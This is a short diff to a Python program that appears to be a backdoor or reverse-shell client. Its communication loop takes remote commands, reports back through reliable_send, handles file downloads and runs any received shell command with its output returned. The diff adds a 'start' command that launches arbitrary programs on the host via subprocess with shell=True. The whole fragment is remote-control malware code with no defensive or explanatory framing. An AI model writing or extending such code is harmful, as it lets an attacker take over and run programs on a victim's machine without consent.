@@ -72,7 +72,12 @@ def communication():
                 reliable_send("[+] File Downloaded.")
             except:
                 reliable_send("[!!] Download Failed.")
-                
+        elif command[:5] == "start":
+            try :
+                subprocess.Popen(command[6:], shell=True)
+                reliable_send("[+] Program Start.")
+            except:
+                reliable_send("[!!] Program Can not start.")
         else:
             proc = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE , stderr=subprocess.PIPE , stdin=subprocess.PIPE)
             response = proc.stdout.read() + proc.stderr.read()
